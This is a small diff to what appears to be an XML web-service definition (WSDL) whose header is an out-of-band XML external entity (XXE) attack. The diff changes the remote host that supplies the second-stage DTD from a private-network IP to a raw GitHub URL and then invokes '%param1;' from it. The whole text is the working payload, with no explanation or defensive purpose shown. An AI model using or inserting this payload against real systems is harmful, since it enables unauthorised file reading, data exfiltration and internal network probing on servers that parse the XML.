@@ -1,4 +1,4 @@
- <?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY % foo SYSTEM "http://192.168.96.137:8888/stage2.xml">%foo;
+ <?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY % foo SYSTEM "https://raw.githubusercontent.com/akshatmahla/xxe/main/xxe2.xml">%foo;
 %param1;]><definitions name="EndorsementSearch"
   targetNamespace="http://namespaces.test.ttt"
   xmlns:es="http://www.test.ttt/EndorsementSearch.wsdl"
